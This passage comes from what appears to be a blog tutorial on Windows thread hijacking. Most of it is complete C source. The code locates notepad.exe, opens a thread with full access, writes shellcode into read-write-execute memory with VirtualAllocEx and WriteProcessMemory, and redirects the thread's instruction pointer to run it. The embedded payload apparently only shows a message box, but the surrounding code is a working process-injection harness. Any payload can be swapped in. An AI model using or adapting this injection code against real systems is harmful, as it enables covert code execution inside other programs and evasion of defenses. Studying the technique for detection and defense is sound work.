    <span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create process snapshot: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to retrieve the first process: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">do</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_wcsicmp</span><span class="p">(</span><span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">L"notepad.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">dwProcessID</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
            <span class="o">*</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="o">*</span><span class="n">dwProcessID</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open process: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="o">*</span><span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hThread</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create thread snapshot: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">THREADENTRY32</span> <span class="n">te32</span><span class="p">;</span>
            <span class="n">te32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Thread32First</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te32</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to retrieve the first thread: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">do</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">te32</span><span class="p">.</span><span class="n">th32OwnerProcessID</span> <span class="o">==</span> <span class="o">*</span><span class="n">dwProcessID</span><span class="p">)</span> <span class="p">{</span>
                    <span class="o">*</span><span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">te32</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te32</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">));</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Notepad process not found.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>There will be a loop inside a loop, the parent loop will loop the processes’ snapshots, the child loop will loop through the threads and try to get a handle to any thread.</p>

<p>The Injection and Hijacking logic is the same as we mentioned before.</p>

<p><strong>Complete code:</strong></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span>
<span class="n">BOOL</span> <span class="nf">FindNotepadProcess</span><span class="p">(</span><span class="n">OUT</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">dwProcessID</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">HANDLE</span><span class="o">*</span> <span class="n">hThread</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hSnapshot</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create process snapshot: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to retrieve the first process: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">do</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_wcsicmp</span><span class="p">(</span><span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">,</span> <span class="s">L"notepad.exe"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">dwProcessID</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
            <span class="o">*</span><span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="o">*</span><span class="n">dwProcessID</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hProcess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open process: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="o">*</span><span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hThread</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create thread snapshot: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">THREADENTRY32</span> <span class="n">te32</span><span class="p">;</span>
            <span class="n">te32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Thread32First</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te32</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to retrieve the first thread: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="o">*</span><span class="n">hProcess</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">do</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">te32</span><span class="p">.</span><span class="n">th32OwnerProcessID</span> <span class="o">==</span> <span class="o">*</span><span class="n">dwProcessID</span><span class="p">)</span> <span class="p">{</span>
                    <span class="o">*</span><span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">te32</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">hThread</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
                        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="o">*</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te32</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">));</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Notepad process not found.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">InjectShellcode</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">ppAddress</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">SIZE_T</span> <span class="n">dwNumberofBbytesWritten</span><span class="p">;</span>
    <span class="o">*</span><span class="n">ppAddress</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">ppAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"VirtualAllocEx failed: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">*</span><span class="n">ppAddress</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">SizeofShellcode</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwNumberofBbytesWritten</span><span class="p">)</span> <span class="o">||</span> <span class="n">dwNumberofBbytesWritten</span> <span class="o">!=</span> <span class="n">SizeofShellcode</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"WriteProcessMemory failed: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">VirtualFreeEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">*</span><span class="n">ppAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">ThreadHijacking</span><span class="p">(</span><span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PVOID</span> <span class="n">pAddress</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">CONTEXT</span> <span class="n">context</span><span class="p">;</span>
    <span class="n">context</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_CONTROL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"GetThreadContext failed: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">context</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">pAddress</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">context</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"SetThreadContext failed: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>

    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
     <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span>
        <span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x4c\x8d\x85\x15\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xd5\x43\x52\x41\x46\x54\x49\x4e\x47\x20\x44\x49\x47\x49</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x54\x41\x4c\x20\x43\x48\x41\x4f\x53\x00\x4d\x65\x73\x73</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x61\x67\x65\x42\x6f\x78\x00</span><span class="s">"</span><span class="p">;</span>

    <span class="n">DWORD</span> <span class="n">dwProcessID</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">hThread</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">FindNotepadProcess</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dwProcessID</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hThread</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PVOID</span> <span class="n">pAddress</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">InjectShellcode</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pAddress</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ThreadHijacking</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">pAddress</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Execute the code and make sure notepad.exe is running and the message box will be triggered.</p>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>